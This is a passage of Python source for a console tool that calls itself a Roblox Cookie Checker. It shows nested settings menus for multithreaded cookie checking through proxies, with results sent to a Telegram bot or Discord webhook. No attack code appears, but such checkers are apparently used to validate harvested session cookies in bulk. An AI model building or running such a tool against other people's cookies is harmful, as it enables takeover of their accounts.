                                                                                        match confirmTheAction.upper():
                                                                                            case 'Y' | 'Н':
                                                                                                whileTrueStageChatID = False
                                                                                                config['Roblox']['General']['Outputs']['Telegram_Bot_Chat_ID'] = str(data['result'][-1]['message']['chat']['id'])
                                                                                                await autoSaveConfig()
                                                                                                await removeLines(8)
                                                                                            case 'N' | 'Т':
                                                                                                return await errorOrCorrectHandler(True, 8, f'{ANSI.FG.RED}{MT_Unsuccessfully}{ANSI.CLEAR + ANSI.DECOR.BOLD} | {MT_Send_Any_Message_To_The_Bot_And_Try_Again}...', f'{MT_Settings}\\{MT_Roblox}\\{MT_General}\\{MT_Outputs}\\{MT_Telegram_Bot}')
                                                                                            case _:
                                                                                                await removeLines(7)
                                                                                except KeyError:
                                                                                    return await errorOrCorrectHandler(True, 2, f'{ANSI.FG.RED}{MT_Unsuccessfully}{ANSI.CLEAR + ANSI.DECOR.BOLD} | {MT_Possibly_A_Typo_In_The_Bot_Token}...',          f'{MT_Settings}\\{MT_Roblox}\\{MT_General}\\{MT_Outputs}\\{MT_Telegram_Bot}')
                                                                                except IndexError:
                                                                                    return await errorOrCorrectHandler(True, 2, f'{ANSI.FG.RED}{MT_Unsuccessfully}{ANSI.CLEAR + ANSI.DECOR.BOLD} | {MT_Send_Any_Message_To_The_Bot_And_Try_Again}...', f'{MT_Settings}\\{MT_Roblox}\\{MT_General}\\{MT_Outputs}\\{MT_Telegram_Bot}')
                                                                                except (TelegramNetworkError, ClientConnectorDNSError):
                                                                                    return await errorOrCorrectHandler(True, 2, f'{ANSI.FG.RED}{MT_Unsuccessfully}{ANSI.CLEAR + ANSI.DECOR.BOLD} | {MT_Possibly_The_Internet_Is_Unstable}...',         f'{MT_Settings}\\{MT_Roblox}\\{MT_General}\\{MT_Outputs}\\{MT_Telegram_Bot}')
                                                                                except Exception as e:
                                                                                    return await errorOrCorrectHandler(True, 2, f'{ANSI.FG.RED}{MT_Unsuccessfully}{ANSI.CLEAR + ANSI.DECOR.BOLD} | {MT_Unknown_Error}: {e}',                           f'{MT_Settings}\\{MT_Roblox}\\{MT_General}\\{MT_Outputs}\\{MT_Telegram_Bot}')

                                                                            await findChatID()
                                                                        case '4':
                                                                            async def testMeowTelegram():
                                                                                if not config['Roblox']['General']['Outputs']['Telegram_Bot_Token']:
                                                                                    return await errorOrCorrectHandler(True, 12, MT_Specify_The_Bot_Token, f'')
                                                                                if not config['Roblox']['General']['Outputs']['Telegram_Bot_Chat_ID']:
                                                                                    return await errorOrCorrectHandler(True, 12, MT_Specify_The_Chat_ID,   f'')

                                                                                await removeLines(10)
                                                                                sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}~{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Wait[0]}...')
                                                                                sys.stdout.flush()
                                                                                await sendMessageTelegramBot(
                                                                                    config['Roblox']['General']['Outputs']['Telegram_Bot_Token'],
                                                                                    config['Roblox']['General']['Outputs']['Telegram_Bot_Chat_ID'],
                                                                                    'Meow :3'
                                                                                )
                                                                                sys.stdout.write('\n')
                                                                                await waitingInput()

                                                                            await testMeowTelegram()
                                                                        case '5':
                                                                            config['Roblox']['General']['Outputs']['Send_Results_To_Telegram_Bot'] ^= True
                                                                        case 'C' | 'С':
                                                                            await openLink('https://t.me/BotFather', f'{MT_Settings}\\{MT_Roblox}\\{MT_General}\\{MT_Outputs}\\{MT_Telegram_Bot}', 12)
                                                                        case '0':
                                                                            whileTrueStage5 = False
                                                                        case 'F' | 'А':
                                                                            await cls()
                                                                            await lableASCII()
                                                                        case 'R' | 'К':
                                                                            loadConfig(configLoader['Loader']['Current_Config'])
                                                                        case _:
                                                                            await removeLines(12)

                                                                    await autoSaveConfigAndRemoveLinesInSettings(settingsRobloxGeneralOutputsTGTab.upper(), ('5'), ('0', 'R', 'К'), 12)
                                                            case '2':
                                                                whileTrueStage5 = True
                                                                await removeLines(8)
                                                                while whileTrueStage5:
                                                                    sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_General}\\{MT_Outputs}\\{MT_Discord_Webhook}{ANSI.CLEAR}\n\n [{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Specify} {MT_Webhook_URL[1]}' if not str(config['Roblox']['General']['Outputs']['Discord_Webhook_URL']) else f'{MT_Webhook_URL[0]}: {config['Roblox']['General']['Outputs']['Discord_Webhook_URL'].replace('https://discord.com/api/webhooks', '..')}'}\n [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ Meow...\n [{ANSI.FG.PINK}3{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['General']['Outputs']['Send_Results_To_Discord_Webhook'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Send[0]} {MT_Results_To_Discord[0].lower() + MT_Results_To_Discord[1:]}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                                                    settingsRobloxGeneralOutputsDSTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                                                    match settingsRobloxGeneralOutputsDSTab.upper():
                                                                        case '1':
                                                                            await removeLines(8)
                                                                            sys.stdout.write(f'\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}?{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Format}: https://discord.com/api/webhooks/../..\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}\n\n')
                                                                            settingsRobloxGeneralOutputsDSWebhookURLEnter = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_A_Webhook_URL}:{ANSI.CLEAR} ')

                                                                            async def changeDiscordWebhookURL():
                                                                                if settingsRobloxGeneralOutputsDSWebhookURLEnter == '0': return await removeLines(7)
                                                                                if settingsRobloxGeneralOutputsDSWebhookURLEnter.strip() == '':
                                                                                    return await errorOrCorrectHandler(True, 7, MT_Value_Cannot_Be_Empty, f'{MT_Settings}\\{MT_Roblox}\\{MT_General}\\{MT_Outputs}\\{MT_Discord_Webhook}')

                                                                                config['Roblox']['General']['Outputs']['Discord_Webhook_URL'] = settingsRobloxGeneralOutputsDSWebhookURLEnter
                                                                                await autoSaveConfig()
                                                                                await cls()
                                                                                await lableASCII()

                                                                            await changeDiscordWebhookURL()
                                                                        case '2':
                                                                            async def testMeowDiscord():
                                                                                if not config['Roblox']['General']['Outputs']['Discord_Webhook_URL']:
                                                                                    return await errorOrCorrectHandler(True, 8, MT_Specify_The_Webhook_URL, f'{MT_Settings}\\{MT_Roblox}\\{MT_General}\\{MT_Outputs}\\{MT_Discord_Webhook}')

                                                                                await removeLines(7)
                                                                                sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}~{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Wait[0]}...')
                                                                                sys.stdout.flush()
                                                                                await sendMessageDiscordWebhook(
                                                                                    config['Roblox']['General']['Outputs']['Discord_Webhook_URL'],
                                                                                    'Meow :3'
                                                                                )
                                                                                sys.stdout.write('\n')
                                                                                await waitingInput()

                                                                            await testMeowDiscord()
                                                                        case '3':
                                                                            config['Roblox']['General']['Outputs']['Send_Results_To_Discord_Webhook'] ^= True
                                                                        case '0':
                                                                            whileTrueStage5 = False
                                                                        case 'F' | 'А':
                                                                            await cls()
                                                                            await lableASCII()
                                                                        case 'R' | 'К':
                                                                            loadConfig(configLoader['Loader']['Current_Config'])
                                                                        case _:
                                                                            await removeLines(9)

                                                                    await autoSaveConfigAndRemoveLinesInSettings(settingsRobloxGeneralOutputsDSTab.upper(), ('3'), ('0', 'R', 'К'), 9)
                                                            case '0':
                                                                whileTrueStage4 = False
                                                            case 'F' | 'А':
                                                                await cls()
                                                                await lableASCII()
                                                            case 'R' | 'К':
                                                                loadConfig(configLoader['Loader']['Current_Config'])
                                                            case _:
                                                                await removeLines(8)

                                                        await autoSaveConfigAndRemoveLinesInSettings(settingsRobloxGeneralOutputsTab.upper(), (), ('0', 'R', 'К'), 8)
                                                case '0':
                                                    whileTrueStage3 = False
                                                case 'F' | 'А':
                                                    await cls()
                                                    await lableASCII()
                                                case 'R' | 'К':
                                                    loadConfig(configLoader['Loader']['Current_Config'])
                                                case _:
                                                    await removeLines(9)

                                            await autoSaveConfigAndRemoveLinesInSettings(settingsRobloxGeneralTab.upper(), ('1', '2'), ('0', 'R', 'К'), 9)
                                    # Роблокс Куки Чекер (RCC)
                                    case '2':
                                        whileTrueStage3 = True
                                        await removeLines(13)
                                        while whileTrueStage3:
                                            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_General}\n {ANSI.CLEAR + ANSI.DECOR.BOLD}[{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['CookieChecker']['Proxy']['Use_Proxy'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Proxy}\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}3{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['CookieChecker']['Sorting']['Sort'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Sorting}\n {ANSI.CLEAR + ANSI.DECOR.BOLD}[{ANSI.FG.PINK}4{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Main}\n [{ANSI.FG.PINK}5{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Places}\n [{ANSI.FG.PINK}6{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Custom_Places}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                            settingsRCCTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                            match settingsRCCTab.upper():
                                                # Общее
                                                case '1':
                                                    whileTrueStage4 = True
                                                    await removeLines(12)
                                                    while whileTrueStage4:
                                                        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_General}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['CookieChecker']['General']['First_Check_All_Cookies_For_Valid'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_First_Check_All_Cookies_For_Valid}\n [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Number_Of_Threads_For_Valid_Checker}: {config['Roblox']['CookieChecker']['General']['Number_Of_Threads_For_Valid_Checker'] if str(config['Roblox']['CookieChecker']['General']['Number_Of_Threads_For_Valid_Checker']).isdigit() and (0 < int(config['Roblox']['CookieChecker']['General']['Number_Of_Threads_For_Valid_Checker']) <= 500) else 10}\n [{ANSI.FG.PINK}3{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Number_Of_Threads_For_Main_Checker}: {config['Roblox']['CookieChecker']['General']['Number_Of_Threads_For_Main_Checker'] if str(config['Roblox']['CookieChecker']['General']['Number_Of_Threads_For_Main_Checker']).isdigit() and (0 < int(config['Roblox']['CookieChecker']['General']['Number_Of_Threads_For_Main_Checker']) <= 500) else 10}\n [{ANSI.FG.PINK}4{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['CookieChecker']['General']['Use_SSL'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Use_SSL}\n [{ANSI.FG.PINK}5{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['CookieChecker']['General']['Name_Output_File_The_Same_As_Input_File'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Name_Output_File_The_Same_As_Input_File}\n [{ANSI.FG.PINK}6{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Output_Filename}: {config['Roblox']['CookieChecker']['General']['Output_Filename'] if not any(char in config['Roblox']['CookieChecker']['General']['Output_Filename'] for char in ['\\', '/', ':', '*', '?', '"', '<', '>', '|']) and len(config['Roblox']['CookieChecker']['General']['Output_Filename']) <= 50 else 'output'}\n [{ANSI.FG.PINK}7{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['CookieChecker']['General']['Output_Total'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Output_Total}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                                        settingsRCCGeneralTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                                        match settingsRCCGeneralTab.upper():
                                                            case '1':
                                                                config['Roblox']['CookieChecker']['General']['First_Check_All_Cookies_For_Valid'] ^= True
                                                            case '2':
                                                                whileTrueStage5 = True
                                                                await removeLines(13)
                                                                while whileTrueStage5:
                                                                    sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_General}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                                                    settingsRCCGeneralValidThreadsTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Number_Of_Threads}:{ANSI.CLEAR} ')

                                                                    async def changeRCCNumberOfThreadsForValid():
                                                                        if settingsRCCGeneralValidThreadsTab == '0': return await removeLines(5)
                                                                        if not settingsRCCGeneralValidThreadsTab.isdigit():
                                                                            return await errorOrCorrectHandler(True, 5, MT_Incorrect_Value,             f'{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_General}')
                                                                        if int(settingsRCCGeneralValidThreadsTab) > 500:
                                                                            return await errorOrCorrectHandler(True, 5, MT_Incorrect_Number_Of_Threads_500, f'{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_General}')

                                                                        config['Roblox']['CookieChecker']['General']['Number_Of_Threads_For_Valid_Checker'] = int(settingsRCCGeneralValidThreadsTab)
                                                                        await autoSaveConfig()
                                                                        await removeLines(5)

                                                                    await changeRCCNumberOfThreadsForValid()
                                                                    whileTrueStage5 = False
                                                            case '3':
                                                                whileTrueStage5 = True
                                                                await removeLines(13)
                                                                while whileTrueStage5:
                                                                    sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_General}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                                                    settingsRCCGeneralCheckerThreadsTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Number_Of_Threads}:{ANSI.CLEAR} ')

                                                                    async def changeRCCNumberOfThreadsForChecker():
                                                                        if settingsRCCGeneralCheckerThreadsTab == '0': return await removeLines(5)
                                                                        if not settingsRCCGeneralCheckerThreadsTab.isdigit():
                                                                            return await errorOrCorrectHandler(True, 5, MT_Incorrect_Value,             f'{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_General}')
                                                                        if int(settingsRCCGeneralCheckerThreadsTab) > 500:
                                                                            return await errorOrCorrectHandler(True, 5, MT_Incorrect_Number_Of_Threads_500, f'{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_General}')

                                                                        config['Roblox']['CookieChecker']['General']['Number_Of_Threads_For_Main_Checker'] = int(settingsRCCGeneralCheckerThreadsTab)
                                                                        await autoSaveConfig()
                                                                        await removeLines(5)

                                                                    await changeRCCNumberOfThreadsForChecker()
                                                                    whileTrueStage5 = False
                                                            case '4':
                                                                config['Roblox']['CookieChecker']['General']['Use_SSL'] ^= True
                                                            case '5':
                                                                config['Roblox']['CookieChecker']['General']['Name_Output_File_The_Same_As_Input_File'] ^= True
                                                            case '6':
                                                                await removeLines(11)
                                                                newRobloxCheckerOutputFilename = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Cancel}\n\n [{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_New_Filename}:{ANSI.CLEAR} ')

                                                                async def changeRobloxCheckerOutputFilename():
                                                                    if newRobloxCheckerOutputFilename == '0': return await removeLines(5)
                                                                    if newRobloxCheckerOutputFilename.strip() == '':
                                                                        return await errorOrCorrectHandler(True, 5, MT_Incorrect_File_Name,         f'{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_General}')
                                                                    if len(newRobloxCheckerOutputFilename) > 50:
                                                                        return await errorOrCorrectHandler(True, 5, MT_Incorrect_Length_Of_Name_50, f'{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_General}')
                                                                    if any(char in newRobloxCheckerOutputFilename for char in ['\\', '/', ':', '*', '?', '"', '<', '>', '|']):
                                                                        return await errorOrCorrectHandler(True, 5, MT_Incorrect_File_Name,         f'{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_General}')

                                                                    config['Roblox']['CookieChecker']['General']['Output_Filename'] = newRobloxCheckerOutputFilename.replace('.txt', '')
                                                                    await autoSaveConfig()
                                                                    await removeLines(5)

                                                                await changeRobloxCheckerOutputFilename()
                                                            case '7':
                                                                config['Roblox']['CookieChecker']['General']['Output_Total'] ^= True
                                                            case '0':
                                                                whileTrueStage4 = False
                                                            case 'F' | 'А':
                                                                await cls()
                                                                await lableASCII()
                                                            case 'R' | 'К':
                                                                loadConfig(configLoader['Loader']['Current_Config'])
                                                            case _:
                                                                await removeLines(13)

                                                        await autoSaveConfigAndRemoveLinesInSettings(settingsRCCGeneralTab.upper(), ('1', '4', '5', '7'), ('0', 'R', 'К'), 13)
                                                # Прокси
                                                case '2':
                                                    whileTrueStage4 = True
                                                    await removeLines(12)
                                                    while whileTrueStage4:
                                                        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Proxy}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}?{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Format}: {ANSI.FG.GRAY}protocol://{ANSI.CLEAR + ANSI.DECOR.BOLD}ip:port:username:password\n  ┃\n [{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['CookieChecker']['Proxy']['Use_Proxy'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Use_Proxy}\n [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Auto_Protocol_If_Not_Specified}: {config['Roblox']['CookieChecker']['Proxy']['Auto_Protocol_If_Not_Specified'] if config['Roblox']['CookieChecker']['Proxy']['Auto_Protocol_If_Not_Specified'] in ('http', 'socks4', 'socks5') else 'http'}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                                        settingsRCCProxyTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                                        match settingsRCCProxyTab.upper():
                                                            case '1':
                                                                config['Roblox']['CookieChecker']['Proxy']['Use_Proxy'] ^= True
                                                                await autoSaveConfig()
                                                                await removeLines(10)
                                                            case '2':
                                                                whileTrueStage5 = True
                                                                await removeLines(10)
                                                                while whileTrueStage5:
                                                                    sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Proxy}\\{MT_Auto_Protocol}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['CookieChecker']['Proxy']['Auto_Protocol_If_Not_Specified'] == 'http' or config['Roblox']['CookieChecker']['Proxy']['Auto_Protocol_If_Not_Specified'] not in ('http', 'socks4', 'socks5') else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} http\n [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['CookieChecker']['Proxy']['Auto_Protocol_If_Not_Specified'] == 'socks4' else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} socks4\n [{ANSI.FG.PINK}3{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['CookieChecker']['Proxy']['Auto_Protocol_If_Not_Specified'] == 'socks5' else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} socks5\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                                                    settingsRCCProxyAutoProtocolTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                                                    match settingsRCCProxyAutoProtocolTab.upper():
                                                                        case '1':
                                                                            config['Roblox']['CookieChecker']['Proxy']['Auto_Protocol_If_Not_Specified'] = 'http'
                                                                        case '2':
                                                                            config['Roblox']['CookieChecker']['Proxy']['Auto_Protocol_If_Not_Specified'] = 'socks4'
                                                                        case '3':
                                                                            config['Roblox']['CookieChecker']['Proxy']['Auto_Protocol_If_Not_Specified'] = 'socks5'
                                                                        case '0':
                                                                            whileTrueStage5 = False
                                                                        case 'F' | 'А':
                                                                            await cls()
                                                                            await lableASCII()
                                                                        case 'R' | 'К':
                                                                            loadConfig(configLoader['Loader']['Current_Config'])
                                                                        case _:
                                                                            await removeLines(9)

                                                                    await autoSaveConfigAndRemoveLinesInSettings(settingsRCCProxyAutoProtocolTab.upper(), ('1', '2', '3'), ('0', 'R', 'К'), 9)
                                                            case '0':
                                                                whileTrueStage4 = False
                                                                await removeLines(10)
                                                            case 'F' | 'А':
                                                                await cls()
                                                                await lableASCII()
                                                            case 'R' | 'К':
                                                                loadConfig(configLoader['Loader']['Current_Config'])
                                                                await removeLines(10)
                                                            case _:
                                                                await removeLines(10)
                                                # Сортировка
                                                case '3':
                                                    whileTrueStage4 = True
                                                    await removeLines(12)
                                                    while whileTrueStage4:
                                                        global cookieDataCategories; cookieDataCategories = getCookieDataForSort()[0]
                                                        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Sorting}{ANSI.CLEAR}\n\n')
                                                        printSortCategories(cookieDataCategories)
                                                        sys.stdout.write(f'{ANSI.DECOR.BOLD}  ┃\n [{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Enable_All}\n [{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Disable_All}\n  ┃\n [{ANSI.FG.YELLOW}S{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['CookieChecker']['Sorting']['Sort'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Sort}\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                                        settingsRCCGeneralSortTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                                        if settingsRCCGeneralSortTab == '0': whileTrueStage4 = False
                                                        elif settingsRCCGeneralSortTab.isdigit() and int(settingsRCCGeneralSortTab) <= len(getCookieDataForSort()[0]):
                                                            if cookieDataCategories[list(cookieDataCategories)[int(settingsRCCGeneralSortTab) - 1]] == int:
                                                                whileTrueStage5 = True
                                                                await cls()
                                                                await lableASCII()
                                                                while whileTrueStage5:
                                                                    sortValues = await getSortValuesFromCategory(list(cookieDataCategories)[int(settingsRCCGeneralSortTab) - 1])
                                                                    sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Sorting}\\{' '.join(list(cookieDataCategories)[int(settingsRCCGeneralSortTab) - 1].split('_'))}{ANSI.CLEAR}\n\n')
                                                                    await printSortValuesInCategory(sortValues, list(cookieDataCategories)[int(settingsRCCGeneralSortTab) - 1])
                                                                    sys.stdout.write(f'{ANSI.DECOR.BOLD}{f'  ┃\n [{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Enable_All}\n [{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Disable_All}\n  ┃\n' if sortValues else ''} [{ANSI.FG.YELLOW}A{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Add_A_Parameter}\n [{ANSI.FG.YELLOW}C{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['CookieChecker']['Sorting'][list(cookieDataCategories)[int(settingsRCCGeneralSortTab) - 1]][0] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Sort}\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                                                    settingsRCCGeneralSortCategoryTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
